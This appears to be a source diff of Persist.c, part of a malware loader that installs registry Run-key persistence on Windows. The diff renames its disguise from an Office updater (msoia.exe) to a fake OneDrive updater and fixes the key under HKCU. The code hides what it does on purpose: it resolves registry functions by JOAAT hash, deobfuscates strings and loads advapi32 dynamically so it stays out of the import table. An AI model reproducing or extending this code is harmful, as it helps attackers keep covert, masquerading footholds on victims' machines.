@@ -1,27 +1,14 @@
 // =============================================
-// Persist.c - Registry Run-Key Persistence  (non-UAC builds only)
+// Persist.c - Registry Run-Key Persistence
 //
-// UAC builds (build.bat uac / build.bat sideload uac) do NOT compile this
-// file — they use a scheduled task registered inside InstallAndTerminate /
-// SideloadInstallAndContinue instead.
+// Writes a HKCU run-key pointing at the loader's persistence copy.
+// Called by InstallAndContinue (EXE) and SideloadInstallAndContinue (DLL).
 //
-// This file is compiled only for non-UAC builds (build.bat / build.bat sideload).
-// It is called when the persistence copy of msoia.exe detects it is the reboot
-// instance (self-guard in InstallAndTerminate / SideloadInstallAndContinue fires
-// and returns), so the run key is written on every subsequent boot (idempotent).
+//   EXE:      HKCU\...\Run  "OneDriveUpdateSync" = "%APPDATA%\...\OneDriveUpdateSync.exe"
+//   Sideload: HKCU\...\Run  "OneDriveUpdateSync" = "%APPDATA%\...\OneDriveUpdateSync.exe /pf"
 //
-// Always writes to HKCU (medium IL — non-UAC builds run at medium IL):
-//
-//   EXE builds:
-//     HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-//       "OfficeUpdate" = "%APPDATA%\Microsoft\Office\Updates\msoia.exe"
-//
-//   Sideload builds:
-//     HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-//       "OfficeUpdate" = "%APPDATA%\Microsoft\Office\Updates\msoia.exe /pf"
-//
-// advapi32 is loaded dynamically so it does not appear in the IAT.
-// Registry function pointers are resolved by JOAAT hash (no plaintext names).
+// advapi32 is loaded dynamically (not in IAT).
+// Registry function pointers resolved by JOAAT hash.
 // =============================================
 
 #include "Common.h"
@@ -76,7 +63,7 @@ BOOL InstallPersistence(IN PAPI_HASHING pApi) {
     if (!pGetModFNW) return FALSE;
 
     // --- Get EXE path to persist ---
-    // Always point the run key at %APPDATA%\Microsoft\Office\Updates\msoia.exe.
+    // Always point the run key at %APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe.
     // Both install functions (InstallAndTerminate for EXE, SideloadInstallAndContinue
     // for sideload) have already copied the binary there before self-terminating.
     // This function is only reached on reboot (self-guard returned), so the file
@@ -85,7 +72,7 @@ BOOL InstallPersistence(IN PAPI_HASHING pApi) {
     WCHAR szExePath[MAX_PATH + 4] = {0};
     DWORD dwPathLen = 0;
 
-    // Build "%APPDATA%\Microsoft\Office\Updates\msoia.exe" for all builds.
+    // Build "%APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe" for all builds.
     {
         typedef DWORD (WINAPI* fnGetEnvA2)(LPCSTR, LPSTR, DWORD);
         BYTE xGetEnvB[] = XSTR_GET_ENV_VAR_A;   DEOBF(xGetEnvB);
@@ -133,12 +120,7 @@ BOOL InstallPersistence(IN PAPI_HASHING pApi) {
     Pers_A2W(wszRunKey,  (CHAR*)xRunKey);
     Pers_A2W(wszValName, (CHAR*)xValName);
 
-    // --- Choose root key based on elevation level at compile time ---
-#if defined(REQUIRE_ADMINISTRATOR) || defined(REQUIRE_ELEVATION)
-    HKEY hRoot = HKEY_LOCAL_MACHINE;   // high integrity (UAC builds)
-#else
-    HKEY hRoot = HKEY_CURRENT_USER;    // medium integrity (non-UAC builds)
-#endif
+    HKEY hRoot = HKEY_CURRENT_USER;
 
     // --- Write the persistence entry ---
     HKEY hKey = NULL;
